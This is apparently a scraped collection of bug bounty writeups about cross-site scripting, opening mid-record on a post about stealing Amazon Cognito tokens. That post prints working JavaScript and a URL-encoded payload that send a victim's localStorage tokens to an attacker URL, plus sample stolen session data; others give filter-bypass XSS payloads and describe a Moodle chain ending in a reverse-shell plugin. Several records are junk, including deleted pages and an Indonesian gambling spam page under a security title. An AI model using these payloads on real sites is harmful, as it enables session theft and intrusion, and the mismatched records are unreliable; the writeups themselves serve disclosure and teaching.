duplicate. For the next few days, there was no response on this report. During this time, Yash and I kept working on this asset and it was no sooner that we realized about a few design flaw in the system. These were not a vulnerability within themselves but when chaining with the XSS bought the severity of this report to High(7.1). A few related observations that we made were: The system was not using cookies to check for authenticated sessions. Instead it was relying on Authorization Header. The website was using Amazon Cognito for user management and for some reason they had a lot of user’s information stored in the local storage. When a user clicks on logout, he is logged-out of the account but if he closes the window, the authorization token was not revoked. If a user logins from his account in multiple devices and then changes the password, his session tokens are not invalidated from other devices. I quickly wrote this javascript code that would steal the authorization tokens and remove his/her session tokens from the browser. The user would think that he was actually logged out from the browser: var xmlhttp = new XMLHttpRequest(); var theUrl = \"attackers-url\"; //Attacker steals the tokens on this address xmlhttp.open(\"POST\", theUrl); xmlhttp.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\"); xmlhttp.send(JSON.stringify({...localStorage})); localStorage.clear(); I tested it within the console and it worked! Now the only thing required was to trigger XSS leading it to execute this code. This is what or final POC looked like. https://REDACTED.com/redacted_url/url;url=javascript:%76%61%72%20%78%6d%6c%68%74%74%70%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%76%61%72%20%74%68%65%55%72%6c%20%3d%20%22%61%74%74%61%63%6b%65%72%73%2d%75%72%6c%22%3b%20%2f%2f%41%74%74%61%63%6b%65%72%20%73%74%65%61%6c%73%20%74%68%65%20%74%6f%6b%65%6e%73%20%6f%6e%20%74%68%69%73%20%61%64%64%72%65%73%73%78%6d%6c%68%74%74%70%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%74%68%65%55%72%6c%29%3b%78%6d%6c%68%74%74%70%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%22%43%6f%6e%74%65%6e%74%2d%54%79%70%65%22%2c%20%22%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%22%29%3b%78%6d%6c%68%74%74%70%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%7b%2e%2e%2e%6c%6f%63%61%6c%53%74%6f%72%61%67%65%7d%29%29%3b%6c%6f%63%61%6c%53%74%6f%72%61%67%65%2e%63%6c%65%61%72%28%29%3b And the data that we received from the victim’s session looked something like this: {\"CognitoIdentityServiceProvider.69abj1tqnk40eeug2oju2qnaa7.hkr0x01.accessToken\":\"REDACTED\", \"rememberMe\":\"true\", \"CognitoIdentityServiceProvider.69abj1tqnk40eeug2oju2qnaa7.hkr0x01.clockDrift\":\"-1\", \"username\":\"hkr0x01\", \"CognitoIdentityServiceProvider.69abj1tqnk40eeug2oju2qnaa7.LastAuthUser\":\"hkr0x01\", \"CognitoIdentityServiceProvider.69abj1tqnk40eeug2oju2qnaa7.hkr0x01.idToken\":\" REDACTED\"} Moreover, the idToken contained following values: { \"kid\":\"o4Ub0oKqDSdJSEElK\\/nOF1sI79mjLrj0CFNP2fdobCU=\", \"alg\":\"RS256\" } { \"sub\":\"b7bd20bd-c855-4b79-995b-e99fb7f5b61e\", \"email_verified\":true,\"profile\":\"ROLE_TENANT_USER\", \"iss\":\"https:\\/\\/cognito-idp.eu-central-1.amazonaws.com\\/eu-central-1_REDACTED\", \"phone_number_verified\":true, \"cognito:username\":\"hkr0x01\", \"preferred_username\":\"81b619c0-ae28-11e8-9efe-c1f0f85d7f04\", \"given_name\":\"hkr\", \"middle_name\":\"lol\", \"aud\":\"69abj1tqnh40eeug2oju2qnaa7\", \"event_id\":\"3b836566-5dc8-11e9-8441-fd78254b71e5\", \"token_use\":\"id\", \"auth_time\":1555145042, \"phone_number\":\"REDACTED\", \"exp\":1555150790, \"iat\":1555147190, \"family_name\":\"0x01\", \"email\":\"REDACTED ... and then some encrypted values ... Since we were able to fetch the refresh token, we could generate a new authorization token anytime the older one got invalidated. What I learnt? Session tokens when stored in Local Storage, may not necessarily secure the application. It is important to understand the working of an application and then try to adapt the attack vectors so as to create higher impact. Many a times, so called “features” can be leveraged into a vulnerability. One may not be able to discover huge bugs alone, but one can collaborate with your buddies to create stronger attack vectors with innovative approaches. I hope you guys had fun reading this blog post. Do let me know in the comments how you felt. Feel free to share your suggestions into the comment section. If you have any doubts, DM me on twitter @milindpurswani . Categories: Bug Bounty Tags: XSS Milind Purswani hackerone: @milindpurswani Email: milindpurswani [at] gmail.com Website: https://milindpurswani.com Related Posts Bug Bounty Creating your first buffer-overflow in x64 machines If you have no experience of Python, C/C++ or Bash, I recommend you check my previous post. Moreover, you will also learn about some basics of buffer-overflow and understand the attack that we are going Read more… Bug Bounty Getting Started with BufferOverflow in x64 machines This is blog post will lay the foundations to buffer-overflow. I recommend you read this blog first before going to the practical session which is followed in another post. Overview A buffer overflow, or buffer overrun, Read more… Bug Bounty How I could have hijacked a victim’s YouTube notifications! (Google VRP Writeup) Hi, So this is my first writeup, I hope you enjoy it! I was just searching around on YouTube if I could find anything but I was really tired and it was 12:30 in the Read more… -> NPTEL Solutions -> Do cool stuff with Python Hestia | Developed by ThemeIsle"}
{"source_url": "https://www.komodosec.com/post/mime-sniffing-xss", "title": "Exploring MIME Sniffing XSS: A Tale of Google Bug Bounties", "friendly_explanation": "This is a bug bounty writeup from https://www.komodosec.com/post/mime-sniffing-xss. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nExploring MIME Sniffing XSS: A Tale of Google Bug Bounties top of page SERVICES Black Box Penetration Testing SOC 2 Penetration Testing NIS2 Compliance Service Cloud Security Assessment Red-Team Security Testing FDA 510(k) Compliance Application Security Komodo Ranger - Managed Service Third-Party Risk Management CASE STUDIES Third-party Risk Assessments Cybersecurity for FDA 510(k) Red team for Pharma Fintech Penetration Testing Pentest Cyber Company Enterprise Hosting & Dev RESOURCES Penetration Testing FAQs What is a Security Red-Team? Q&A Red-Team Security Testing CTF Challenge CVE Database The 7 Mistakes of Pentesting Rules of Engagement Security Requirements for Due Diligence HackTale Cyber Training by Game ABOUT Our Story Our Customers Careers In the News BLOG More Use tab to navigate through the menu items. Contact Us All Posts Bug-Bounty Application Security Open Source Red Team Zero Day SOC 2 Compliance Compliance Regulations Penetration Testing Cloud Security Assessment Red Team Exercises Cyber Security Due Diligence Black Box Managed Application Security NIS2 Compliance Search Is MIME Sniffing XSS a real thing? [The story of weird Google bug bounties] Komodo Research May 15, 2019 4 min read Updated: Oct 23, 2023 Let’s start at the end. This one got me seriously confused. It all started a few months ago when a colleague was hacking away at some Google website. After some poking around, he detected a persistent XSS vulnerability – the attacker’s payload is stored on the server side and returned to the user without encoding. There was only one catch – The Content-Type of the server response was set to ‘multipart/form-data’ meaning that the browser will not evaluate the HTML and will not execute the JavaScript. - “I Think I’ll report it,” my colleague said, “ Maybe it can be exploited with mime-sniffing. ” - “Good luck,” I responded, with a mocking tone. “You know as well as I that mime-sniffing is dead” . - “we’ll see” , he said “I have nothing to loss by reporting” Soon after my Colleague was rewarded by Google with few thousand dollars for this issue. Within few days he detected yet another instance of mime-sniffing-dependent-XSS, and was rewarded with few thousand dollars more. - “What the hell?” I asked him. - “I’m not sure myself”, he replied, “ But if they pay me the bounties I’m not arguing. Besides, maybe they know something we don’t. ” OK, I thought, homework time! MIME sniffing in a nut shell Generally speaking, browsers look at the Content-Type header in the HTTP response for an indication of how the response should be interpreted. Typically, if the application wants the browser to render HTML content, the HTTP response should include the ‘text/html’ content-type. Similarly, ‘image/jpeg’ content-type should be used for images, etc. ‘Typically’ is the crucial word in that sentence, as different browsers tend to have different approaches for evaluating content-types especially when unknown content-types are used (‘unknown’ in the sense that the specific browser does not have clear instructions on how to evaluate it). In such a case, the browser may try to perform mime-sniffing, i.e. try to ‘understand’ from the content itself how it should be interpreted. In the context of XSS, if the content ‘resembles’ HTML, the browser might understand it as HTML even if the content-type is not set to ‘text/html’. Confused? You’re not alone. When exactly will the browser attempt such a ‘self-understanding’ approach? It depends on the browser, of course, but generally it’s quite a rare thing and mostly applicable to old browsers ( How old? IE 4 old ). To make the attack even less plausible, a specific header (‘X-Content-Type-Options: nosniff’) can be set by the server to indicate to the browser that it should not perform mime-sniffing. This capability has been supported by most major browsers ( with the exception of Safari ) for quite some time ( even in IE 8 ). Missing ‘XCTO header’? Nope Back to the XSS in Google. My colleague considered his mime-sniffing XSS to be a ‘slightly more real’ XSS (i.e. has chances to be exploited in the real world), as the server response he received lacked the ‘X-Content-Type-Options: nosniff’ header, which means that the browser might perform MIME-Sniffing in some cases. While I was not entirely convinced (neither of us were able to create a POC that actually works), I could sort-of accept that Google holds itself to the highest security posture, thus accepting the lack of header as an issue. That is until I found my own XSS. The most confusing Google response of all time A few weeks later, I found my own instance of persistent XSS with non-HTML content type. In my case, the ‘X-Content-Type-Options: nosniff’ was set. Nonetheless, not wanting to miss out on all this bounty goodness, I submitted it as a bug. This triggered the most confusing Google response I could think of. Originally, the bug was rejected, as I could not provide a POC. This was the result I expected. Later, though, this happened: Without any new data from me, Google switched from ‘intended behavior,’ to ‘new,’ to ‘accepted’ just to realize a week later that they were already following this as a bug. Apparently, I’m not the only one to be confused about mime-sniffing. I decided to tackle the issue once and for all and asked Google about it. That was very helpful: Problem solved indeed. At this point I felt that more data is needed (and let’s be honest, more bounties too). So, I decided to invest some time in detecting more such instances and in reporting everything I find. Bounties, bounties, bounties In the following months I’ve detected and reported several more instances, each with slightly different characteristics, including a ‘ZIP’ document response (content-disposition set to ‘attachment’), ‘plain/text’ content type, ‘CSV’ content type, and even ‘Custom’ content-type. Without fail, all of the bugs I’ve reported were accepted (expect those deemed as duplicates), though several required some ‘convincing’: Ah ha! ‘Weird stuff!’ That explains everything. I can now use Google tricks against them: After that last email, the bug was accepted (and I was rewarded). Final thoughts Personally, my thoughts after this research remained similar to those I had before – while I accept that it is a theoretical risk, an XSS that requires mime-sniffing just doesn’t cut it for me. And I’m not alone – as shown above, at least some Google security engineers don’t really see the risk either. With that being said, I have huge respect for Google here for making the decision to treat such XSS as a real risk. Their decision to put their users’ security as first priority and fighting such esoteric vulnerabilities (even at the cost of paying good bounty money) can only be appreciated and I wish other organizations of such caliber would take security half as seriously as Google does. Application Security Bug-Bounty Recent Posts See All Web Application Penetration Testing: What You Need to Know Baking Security Into the Development Lifecycle Nginxproxy - An Open Source WAF to Protect against Malicious File Uploads TALK TO OUR REPRESENTATIVE TO LEARN MORE USA: +1 800 409-0472 UK: +44 20 8089 5205 ISR: +972 9 955 5565 Privacy Policy Copyright © KomodoSec > bottom of page"}
{"source_url": "https://medium.com/@bughunter.sec7/xss-403-forbidden-bypass-akamai-security-write-up-b341f588efb5", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@bughunter.sec7/xss-403-forbidden-bypass-akamai-security-write-up-b341f588efb5. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@ZishanAdThandar/just-5-minute-to-get-my-2nd-stored-xss-on-edmodo-com-fe2ee559e00d", "title": "Just 5 minute to get my 2nd stored XSS on Edmodo.com | by ZishanAdThandar | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ZishanAdThandar/just-5-minute-to-get-my-2nd-stored-xss-on-edmodo-com-fe2ee559e00d. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nJust 5 minute to get my 2nd stored XSS on Edmodo.com | by ZishanAdThandar | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Just 5 minute to get my 2nd stored XSS on Edmodo.com ZishanAdThandar 1 min read · Apr 15, 2019 -- Listen Share My overall experience with edmodo is good. They give quick response + cool swag + lots of input fields to test. 1 cool T-shirt + 1 shaker + 10 badges + 3 i love edmodo magnets This time it was not planned. I was trying on many programs. Suddenly I opened edmodo and this time it redirected to new.edmodo.com. I posted my xss polyglot (as described on my first write up #540a33349662 ) on created school. This time I posted payloads on poll. Then I clicked on my dp to open my profile and it redirected me to www.edmodo.com/* . On this domain, there was some notification. I clicked notification and boom. It’s there. PoC Video (Subscribe to the channel and share): XSS PoC Video on youtube channel Read my methodology on edmodo here #540a33349662 . Timeline: Reported on 31st January, 2019 Rewarded on 4th February, 2019 Swag received on 13th February, 2019 About me: Twitter https://twitter.com/ZishanAdThandar Youtube https://youtube.com/c/ZishanAdThandar First writeup: https://medium.com/@ZishanAdThandar/my-first-stored-xss-on-edmodo-com-540a33349662 Bug Bounty Infosec Hacking Swag Web Security -- -- Written by ZishanAdThandar 91 followers · 218 following https://ZishanAdThandar.github.io No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@bughunter.sec7/stored-xss-on-google-com-e7ac12f03b8e", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@bughunter.sec7/stored-xss-on-google-com-e7ac12f03b8e. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://gauravnarwani.com/a-tale-of-3-xss/", "title": "Not Acceptable!", "friendly_explanation": "This is a bug bounty writeup from https://gauravnarwani.com/a-tale-of-3-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nNot Acceptable! Not Acceptable! An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security."}
{"source_url": "https://medium.com/bugbountywriteup/xss-reflected-xss-bypass-filter-de41d35239a3", "title": "[XSS] Reflected XSS Bypass Filter | by Mohamed Sayed | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/xss-reflected-xss-bypass-filter-de41d35239a3. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n[XSS] Reflected XSS Bypass Filter | by Mohamed Sayed | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication [XSS] Reflected XSS Bypass Filter Mohamed Sayed 2 min read · Apr 22, 2019 -- 6 Listen Share Press enter or click to view image in full size I would like to write about this but it takes some time to bypass the filter and some time to find the right HTML tag to write a payload. I was testing on a program which is private let’s call it example.com I found a search field so I start to test it with my lovely value ‘“>< to know what will be blocked I found that the value added to a lot of places on the source code but almost all of them encoded with HTML-Encode but I found my value added on a tag called dfn without encoding so there is a hope to find an XSS so I added an XSS payload but It redirects me to block page because of these < > values not accepted after a few minutes I understand how the function works the function block the request if this < connected to anything like the word <svg or special char <! and if I write a complete HTML tag the filter will delete all of the tag I tried to bypass it using URL-Encoding but it doesn’t work so I tried double encode and it works to bypass it and I wrote a payload like that %253Csvg onload=alert0)%253E this payload added to the source code but there was a problem that the filter delete this = I tried a lot to bypass this but I couldn’t :( I told to my self what? after all of this time I couldn’t execute XSS payload I asked my friends about payloads without this = and I asked Google but I didn’t found anything, the problem not here the problem is my mind was sleep and when he wakes up I got it I forgot the king of XSS payloads <script>alert(0)</script> WOW I don’t know how I forgot it but this is our guy so I decoded it and try to execute but there is another problem is these two ( ) so I replaced it with `` and the payload executed I was WooooooooooW I like this bug and I like you who completed the topic I hope it is helpful to you guys, thanks for reading this, goodbye. Security Xss Vulnerability Xss Bypass Writeup Infosec -- -- 6 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Mohamed Sayed 549 followers · 36 following My name is Mohamed my nickname is Flex, I’m a Bug Hunter at HackerOne and Synack Red Team Member. Responses ( 6 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.amolbaikar.com/xss-on-facebook-instagram-cdn-server-bypassing-signature-protection/", "title": "ALEXISTOGEL: Situs Bandar Togel Online Terpercaya Nomor 1 Indonesia WD Auto Bayar", "friendly_explanation": "This is a bug bounty writeup from https://www.amolbaikar.com/xss-on-facebook-instagram-cdn-server-bypassing-signature-protection/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nALEXISTOGEL: Situs Bandar Togel Online Terpercaya Nomor 1 Indonesia WD Auto Bayar INTERNAL FEEDBACK Masukan Lebih Murah Di App Download Aplikasinya dan Belanja Sekarang! Belanja di App banyak untungnya: Banyak Vouchernya Produk Eksklusif di App Rekomendasi Hanya Untukmu Paling Pertama Dapat Promo Success! Please check your phone for the download link MENJADI SELLER customer care Pusat Bantuan Order & Pembayaran Pembatalan Pesanan Pengiriman Pengembalian Barang & Dana Hubungi kami di Live Chat (24 Jam) LACAK PESANAN LACAK PESANAN Nomor pesanan: Untuk bantuan silakan, Klik disini Panel Akun Pesanan Saya Wishlist dan Toko yang Saya Ikuti Ulasan Saya Pengembalian & Pembatalan Logout Kategori Peralatan Elektronik Aksesoris Elektronik Fashion & Aksesoris Wanita Fashion & Aksesoris Pria Fashion & Aksesoris Anak Kesehatan & Kecantikan Bayi & Mainan TV & Elektronik Rumah Keperluan Rumah & Gaya Hidup Kebutuhan Rumah Tangga Olahraga & Outdoor Otomotif Handphone Laptop Desktop Kamera Game Console Gadget Tablet Aksesoris Handphone Aksesoris Komputer Audio Aksesoris Berteknologi Aksesoris Kamera Penyimpanan Data Printer Aksesoris Tablet Komponen Komputer Pakaian Wanita Baju Muslim Lingerie, Baju Tidur & Santai Sepatu Wanita Aksesoris Tas Wanita Perhiasan Wanita Jam Tangan Wanita Pakaian Pria Baju Muslim Pakaian Dalam Sepatu Pria Aksesoris Tas Pria Perhiasan Pria Jam Tangan Pria Pakaian Anak Laki-laki Pakaian Anak Perempuan Pakaian Anak Muslim Laki-Laki Pakaian Anak Muslim Perempuan Sepatu Anak Laki-laki Sepatu Anak Perempuan Tas Anak Perhiasan Anak Jam Tangan Anak Perawatan Kulit Makeup Perawatan Rambut Perawatan Tubuh Perawatan Diri Parfum Alat Kecantikan Suplemen Makanan Alat Medis Sexual Wellness Perawatan Pria Popok Dewasa Ibu & Anak Popok Sekali Pakai Makanan Bayi & Balita Pakaian & Aksesoris Perlengkapan Menyusui Perlengkapan Bayi Kamar Bayi Perawatan Bayi Mainan Mainan Elektronik & RC Mainan Olahraga & Luar Ruangan Mainan Bayi & Balita TV & Perangkat Video Peralatan Dapur Kecil Elektronik Rumah Besar Penyejuk dan Pembersih Udara Penghisap Debu & Perawatan Lantai Alat Perawatan Diri Aksesoris & Suku Cadang Aksesoris Televisi Home Entertainment Dekorasi Rumah Furnitur Kelengkapan Tempat Tidur Penerangan Peralatan Mandi Alat Dapur Binatu & Alat Kebersihan Perkakas & Perbaikan Rumah Kebun & Luar Ruangan Alat Tulis & Kerajinan Media, Musik & Buku Minuman Bahan & Bumbu Masakan Cokelat, Camilan & Permen Makanan Sarapan, Sereal & Selai Buah & Sayur Kebutuhan Rumah Tangga Makanan Hewan Peliharaan Aksesoris Hewan Peliharaan Kesehatan Hewan Peliharaan Baju Olahraga Pria Baju Olahraga Wanita Sepatu Olahraga Pria Sepatu Olahraga Wanita Camping dan Hiking Peralatan Memancing Olahraga Sepeda Olahraga Air Gym, Yoga & Fitness Olahraga Raket Perlengkapan Olahraga Perlengkapan Sepak Bola Suku Cadang & Peralatan Mobil Aksesoris Interior Mobil Aksesoris Exterior Mobil Kamera Mobil, Audio & Video Perawatan & Pengkilat Mobil Ban & Velg Mobil Oli & Cairan Mobil Perlengkapan Berkendara & Helm Suku Cadang & Peralatan Motor Aksesoris & Elektronik Motor Ban, Velg, Oli & Cairan Motor Kendaraan ALEXISTOGEL SITUS TOGEL BANDAR TOGEL TOGEL ONLINE Kategori Peralatan Elektronik Aksesoris Elektronik Fashion & Aksesoris Wanita Fashion & Aksesoris Pria Fashion & Aksesoris Anak Kesehatan & Kecantikan Bayi & Mainan TV & Elektronik Rumah Keperluan Rumah & Gaya Hidup Kebutuhan Rumah Tangga Olahraga & Outdoor Otomotif Handphone Laptop Desktop Kamera Game Console Gadget Tablet Aksesoris Handphone Aksesoris Komputer Audio Aksesoris Berteknologi Aksesoris Kamera Penyimpanan Data Printer Aksesoris Tablet Komponen Komputer Pakaian Wanita Baju Muslim Lingerie, Baju Tidur & Santai Sepatu Wanita Aksesoris Tas Wanita Perhiasan Wanita Jam Tangan Wanita Pakaian Pria Baju Muslim Pakaian Dalam Sepatu Pria Aksesoris Tas Pria Perhiasan Pria Jam Tangan Pria Pakaian Anak Laki-laki Pakaian Anak Perempuan Pakaian Anak Muslim Laki-Laki Pakaian Anak Muslim Perempuan Sepatu Anak Laki-laki Sepatu Anak Perempuan Tas Anak Perhiasan Anak Jam Tangan Anak Perawatan Kulit Makeup Perawatan Rambut Perawatan Tubuh Perawatan Diri Parfum Alat Kecantikan Suplemen Makanan Alat Medis Sexual Wellness Perawatan Pria Popok Dewasa Ibu & Anak Popok Sekali Pakai Makanan Bayi & Balita Pakaian & Aksesoris Perlengkapan Menyusui Perlengkapan Bayi Kamar Bayi Perawatan Bayi Mainan Mainan Elektronik & RC Mainan Olahraga & Luar Ruangan Mainan Bayi & Balita TV & Perangkat Video Peralatan Dapur Kecil Elektronik Rumah Besar Penyejuk dan Pembersih Udara Penghisap Debu & Perawatan Lantai Alat Perawatan Diri Aksesoris & Suku Cadang Aksesoris Televisi Home Entertainment Dekorasi Rumah Furnitur Kelengkapan Tempat Tidur Penerangan Peralatan Mandi Alat Dapur Binatu & Alat Kebersihan Perkakas & Perbaikan Rumah Kebun & Luar Ruangan Alat Tulis & Kerajinan Media, Musik & Buku Minuman Bahan & Bumbu Masakan Cokelat, Camilan & Permen Makanan Sarapan, Sereal & Selai Buah & Sayur Kebutuhan Rumah Tangga Makanan Hewan Peliharaan Aksesoris Hewan Peliharaan Kesehatan Hewan Peliharaan Baju Olahraga Pria Baju Olahraga Wanita Sepatu Olahraga Pria Sepatu Olahraga Wanita Camping dan Hiking Peralatan Memancing Olahraga Sepeda Olahraga Air Gym, Yoga & Fitness Olahraga Raket Perlengkapan Olahraga Perlengkapan Sepak Bola Suku Cadang & PeralatanMobil Aksesoris Interior Mobil Aksesoris Exterior Mobil Kamera Mobil, Audio & Video Perawatan & Pengkilat Mobil Ban & Velg Mobil Oli & Cairan Mobil Perlengkapan Berkendara & Helm Suku Cadang & Peralatan Motor Aksesoris & Elektronik Motor Ban, Velg, Oli & Cairan Motor Kendaraan ALEXISTOGEL SITUS TOGEL BANDAR TOGEL TOGEL ONLINE ALEXISTOGEL: Situs Bandar Togel Online Terpercaya Nomor 1 Indonesia WD Auto Bayar 8.744.154 Penilaian 62.487.778 : ALEXISTOGEL ALEXISTOGEL merupakan salah satu situs bandar togel online terpercaya yang terkenal di kalangan togelmania. Hal yang membuat fenomena ini bisa terjadi adalah setiap withdraw yang diberikan selalu dibayar lunas tanpa ditunda. Jenis permainan yang beragam dengan peluang menang tinggi juga menjadi bagian daya tarik dari situs ini. Serta hal yang tidak kalah penting adalah sistem pelayanan 24 jam yang selalu siap dalam membantu menyelesaikan kendala. Trending Tags: alexistogel alexis togel situs togel bandar togel terpercaya bandar togel resmi bandar togel bandar togel online bandar terpercaya situs togel online situs togel terpercaya situs togel resmi situs togel terbesar togel online Rp.7.777 Rp.77.00 -77% LOGIN DAFTAR Pilihan pengiriman DKI Jakarta, Kota Jakarta Pusat, Kemayoran UBAH Standar Dijamin tiba 10 Nov - 12 Nov. Dapatkan LazRewards Rp10.000 jika pesananmu terlambat Rp8.888 Bayar di tempat berlaku Pengembalian & Garansi Berubah Pikiran 7 Hari Gratis Pengembalian Tidak ada garansi Dijual oleh ALEXISTOGEL Rating Toko 98% Pengiriman Tepat Waktu 100% Chat Dibalas 100% Layanan Pelanggan Pusat Bantuan Cara Pembelian Pengiriman Kebijakan Produk Internasional Cara Pengembalian Ada pertanyaan? Hubungi kami di live chat (24 Jam) Jelajahi Lazada Tentang Lazada Afï¬liate Program Karir Syarat & Ketentuan Kebijakan Privasi Press & Media Jual Di Lazada Lazada Security Intellectual Property Protection Go where your heart beats Download the App Metode Pembayaran Jasa Pengiriman Verified by Lazada Southeast Asia Follow Us Â© Lazada 2025 Layanan Pelanggan Pusat Bantuan Cara Pembelian Pengiriman Kebijakan Produk Internasional Cara Pengembalian Ada pertanyaan? Hubungi kami di live chat (24 Jam) Jelajahi Lazada Tentang Lazada Afï¬liate Program Karir Syarat & Ketentuan Kebijakan Privasi Press & Media Jual Di Lazada Lazada Security Intellectual Property Protection Always Better Download the App Metode Pembayaran Jasa Pengiriman Verified by Lazada Southeast Asia Follow Us © ALEXISTOGEL 2025 by-Seo Campak"}
{"source_url": "https://medium.com/@daniel.thatcher/obtaining-xss-using-moodle-features-and-minor-bugs-2035665989cc", "title": "Obtaining XSS Using Moodle Features and Minor Bugs | by Daniel Thatcher | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@daniel.thatcher/obtaining-xss-using-moodle-features-and-minor-bugs-2035665989cc. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nObtaining XSS Using Moodle Features and Minor Bugs | by Daniel Thatcher | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Obtaining XSS Using Moodle Features and Minor Bugs Daniel Thatcher 6 min read · Apr 9, 2019 -- 3 Listen Share Moodle allowed users to embed arbitrary HTML in their own dashboards, which are only visible to themselves, creating a situation which is equivalent to self-XSS. In this blog post I describe how it was possible to exploit this by setting a second session cookie with a restricted path, initially in combination with login CSRF, and then by using Moodle’s builtin impersonation functionality, to target other users. While much of the previous exploitation of self-XSS only allows the attacker to obtain read-only access to the DOM, this technique allows JavaScript to be run as the victim user, as with any regular XSS. The following video shows how an administrator can be targeted to give an attacker shell access to the Moodle server. In this video, an administrator follows a link sent to them by an attacker. The next time the administrator logs in to their account in the same browser, a malicious plugin which gives the attacker a shell on the web server is uploaded using JavaScript. Targeting an administrator to upload a malicious plugin Introduction A while ago I came across some interesting techniques for exploiting self-XSS in combination with other issues, so when I noticed the following in a Moodle security announcement I was very interested: Authenticated user[sic] are allowed to add HTML blocks containing scripts to their Dashboard and this is normally not a security issue because personal dashboard is visible to this user only. While this is more of a feature than it is stored self-XSS, it does create an equivalent situation as users are able to insert arbitrary HTML and JavaScript which is run in the context of the target domain, but should only ever be rendered in their browser. The login form also had no CSRF protection, making it possible to use the techniques I mentioned to obtain read-only access to any page a victim user is able to view. This did not allow anything of great interest to be leaked from a Moodle installation with minimal extra configurations (perhaps due to my lack of knowledge of Moodle), so I looked for ways to turn this into full XSS where I could run arbitrary JavaScript as a victim user. Double Session Cookies The method I came up with takes advantage of the way that PHP and browsers treat multiple cookies with the same name. PHP I found that if two session cookies are sent in a request to Moodle, the first session cookie which appears in the Cookie header is used, while the second is ignored. So, in the request below, the session cookie highlighted in bold is used to identify the logged in user, while the other session cookie of the same name is ignored: GET /my/ HTTP/1.1 ... Cookie: MoodleSession= 0ab0af2b5369369af1fae6b097cf64f7 ; MoodleSession=d879cda2c1b27a4eefa02e7a48a63d73 This is a result of PHP’s behaviour for handling multiple cookies, which leads to only the first cookie being present in the $_COOKIE superglobal. Browsers Chrome and Firefox¹ will generate a request containing duplicate cookies, such as the one above, when different values of the same cookie are set with different paths. So, say there are two cookies are set in the browser: a cookie named MoodleSession with a path of / containing a session identifier associated with Alice’s account; and a cookie named MoodleSession with a path of /my/ containing a session identifier associated with Bob’s account. This will lead to only Alice’s session cookie being sent in requests to paths outside of /my/ , and both session cookies being sent in requests to /my/ , which is the path of the user’s dashboard in Moodle. It appears that both Chrome and Firefox will send cookies with more restrictive paths first, so Bob’s session cookie will be the one sent first, and hence used by Moodle, when the browser requests /my/ . A user of this browser will see all of the site as though they are logged in as Alice, apart from /my/ , which will show Bob’s dashboard. Exploiting The combination of CSRF on the login form and the double session cookie behaviour gives us all we need to target other users with JavaScript embedded on our dashboard. The setup I’m using is a Moodle installation located at http://moodle.lab.local , which contains an administrator account named admin , and a low privileged account which the attacker has access to, named attacker. There is also a server belonging to the attacker at attacker.lab.local . All the files used are available in this GitHub repository . 1. Setup First the attacker embeds a script such as the one from the GitHub repository , part of which is shown below, in their dashboard. This is most easily done by adding a new HTML block and using an intercepting proxy such as BurpSuite. The first stage of the moodle.js script. This script will check if a cookie named poisoned is set in the browser. If it is not, it will set this cookie, and requests a session cookie belonging to the attacker account from the cookie.php script² which it then puts in the MoodleSession cookie with a path of /my/ . The script then causes a logout from the attacker account, which does not invalidate the newly set session cookie as it involves requests to path outside of /my/ . If the poisoned cookie is present then the script will execute the final XSS payload, which I will discuss later. 2. Attack The attacker now targets their victim user, in this case the owner of the admin account, with a simple login CSRF payload such as the one below which logs the victim in to the attacker account. Login CSRF to force a user to be logged in to the ‘attacker’ account. This will cause the victim to view the dashboard of the attacker account, and the script from the previous subsection to be run in their browser. The victim will then have the poisoned cookie and a session cookie belonging to the attacker account set in their browser with a path of /my/ , following which they will be logged out. The next time the victim logs in to the admin account in the same browser, they will be able to browse all of the Moodle installation apart from their dashboard, including the admin panel, as normal. However, the request to /my/ to load their dashboard will return the dashboard of the attacker account with the included script. This script performs the second stage of the attack due to the presence of the poisoned cookie in the browser. 3. Final payload Popping an alert box or loading in DOOM doesn’t obviously show impact here as it will show up on the dashboard of the attacker account rather than the admin account. Since we can still make requests to the admin panel as the admin account, I decided to upload a malicious plugin using JavaScript. This plugin gives the attacker a reverse shell using the version.php file. Targeting an administrator 